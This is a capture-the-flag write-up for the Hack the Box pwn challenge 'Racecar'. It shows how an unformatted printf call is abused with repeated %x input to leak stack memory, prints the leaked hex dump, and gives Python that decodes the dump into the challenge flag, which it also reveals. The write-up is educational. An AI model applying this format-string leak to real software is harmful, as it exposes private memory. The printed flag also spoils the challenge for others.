---
staticPath: racecar
Title: "Hack the Box: Racecar"
Description: Using a format string vulnerability to leak stack data
Date: 2024-11-28
tags:
  - CTF
  - HackTheBox
---
Racecar is a pwn challenge from Hack the Box. Below is where the executable opens the flag file.

![[Pasted image 20241128135930.png]]

Below is where the flag gets read onto the stack. `ebp` is a register that points to the base of the current stack frame which than gets pushed to `eax`.
![[Pasted image 20241128141609.png]]

While trying different strings in the win function i noticed it was a format string vulnerability.
![[Pasted image 20241128140342.png]]

Here's where it calls printf without a format string.

![[Pasted image 20241128140501.png]]

Strings doesn't seem to work for some reason

![[Pasted image 20241128140714.png]]

Spamming `%x` to leak stack data yields the following.

```
56e2b1c0 170 56555dfa 2f 9 26 2 1 5655696c 56e2b1c0 56e2b340 7b425448 5f796877 5f643164 34735f31 745f3376 665f3368 5f67346c 745f6e30 355f3368 6b633474 7d213f 10839500 f7f8a3fc 56558f8c ffc533f8 56556441 1 ffc534a4 ffc534ac 10839500 ffc53410 0 0 f7dcdf21 f7f8a000 f7f8a000 0 f7dcdf21 1 ffc534a4 ffc534ac ffc53434 1 ffc534a4 f7f8a000 f7fa870a ffc534a0 0 f7f8a000 0 0 c1004703 f2d5a113 0 0 0 40 f7fc0024 0 0 f7fa8819 56558f8c 1 56555790 0 565557c1 565563e1 1 ffc534a4 56556490 565564f0 f7fa8960 ffc5349c f7fc0940 1 ffc53d34 0 ffc53d46 ffc53d68 ffc53d9d ffc53dbc ffc53ddf ffc53e0c ffc53e21 ffc53e3d ffc53e5b ffc53e77 ffc53e9f ffc53ee1 ffc53f06 ffc53f27 ffc53f32 ffc53f54 ffc53f61 ffc53f6e ffc53f84 ffc53fa1 ffc53fb5 ffc53fd1 0 20 f7f97550 21 f7f97000 33 6f0 10 178bfbff 6 1000 11 64 3 56555034 4 20 5 9 7 f7f99000 8 0
```

Using some python to decode the hex I get the flag.

```python
for i in hexdump.split(" "):
    try:
       print(bytearray.fromhex(i).decode()[::-1],end="")
    except:
        pass 
```

```
/&liUVHTB{why_d1d_1_s4v3_th3_fl4g_0n_th3_5t4ck?!}AdUV@ !3d4PUV **%**
```

# Final thoughts

Passing a user controlled buffer without a format string to printf is always a bad idea. Doing further research it looks like the reason `%s` doesn't work is because it reads off a number from the stack and then treats that as an address to read a string from. So there would have to be a valid address on the stack for `%s` to work. I found syracuse's [lecture notes](https://web.ecs.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf) helpful for learning more about format string vulnerabilities.